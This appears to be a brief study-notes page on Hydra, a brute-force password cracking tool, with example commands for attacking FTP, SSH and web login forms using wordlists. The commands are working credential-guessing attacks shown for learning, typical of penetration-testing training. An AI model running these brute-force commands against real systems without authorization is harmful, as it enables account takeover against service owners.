---
title: Hydra
layout: notes
---

# What is Hydra?

A brute force password cracking program. Hydra can run through a list and brute force some authentication services.

# Usage

The options passed to Hydra depend on the protocol being attacked, for example, to brute force FTP with username "user" and password list "passlist.txt" we can use:

```bash
hydra -l user -P passlist.txt ftp://ip_address
```

<br/>To attack SSH:

```bash
hydra -l [username] -P [pass_list] [ip_address] -t 4 ssh
```

<br/>The `-t` argument here specifies the number of threads to spawn. Hydra can also be used to brute force web forms:

```bash
sudo hydra -l [username] -P [wordlist] [ip_address] http-post-form "<path>:<login_creds>:<invalid_response>"
```

<br/>For example:

```bash
hydra -l user1 -P wordlist.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```